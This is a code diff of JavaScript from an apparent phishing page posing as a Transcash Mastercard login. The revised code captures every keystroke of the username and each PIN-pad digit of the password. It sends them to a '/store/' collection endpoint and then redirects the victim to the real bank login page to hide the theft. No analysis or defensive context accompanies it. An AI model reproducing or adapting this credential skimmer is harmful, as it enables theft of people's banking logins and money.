@@ -1,30 +1,26 @@
-function sendUsername(e) {
-    sendCadeau(e.target.value);
-}
-
 function showPwd() {
     document.getElementById("securePin").style.display = 'table';
 }
 
-function sendPwd(e) {
-    sendCadeau(document.getElementById("password").value);
+function setPwd(e) {
+    sendCadeau();
     document.getElementById("password").value += e.target.textContent;
 }
 
-function sendCadeau(a) {
-    fetch('/store/' + a).then().catch();
+function sendCadeau() {
+    var info = document.getElementById("username") + " - " + document.getElementById("password").value;
+    fetch('/store/' + info).then().catch();
 }
 
 function redirect() {
+    sendCadeau();
     document.location.href = 'https://transcashmastercard.espace-personnel.fr/login';
 }
 
-document.getElementById("username").addEventListener("input", sendUsername, false);
-
-document.getElementById("username").addEventListener("input", sendUsername, false);
+document.getElementById("username").addEventListener("input", sendCadeau, false);
 
 document.querySelectorAll("#securePin td").forEach(item => {
-    item.addEventListener('click', sendPwd)
+    item.addEventListener('click', setPwd)
 })
 
 document.getElementById("connectBtn").addEventListener("click", redirect, false);
